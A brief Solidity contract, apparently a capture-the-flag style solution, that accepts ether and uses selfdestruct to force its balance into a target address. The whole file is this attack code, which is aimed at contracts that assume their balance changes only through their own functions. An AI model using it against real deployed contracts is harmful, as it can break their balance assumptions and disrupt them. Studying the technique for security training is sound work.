// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttacker {

  function attack(address _addr) external {
    selfdestruct(payable(_addr));
  }

  // Allow contract to receive ether
  receive() external payable {}
}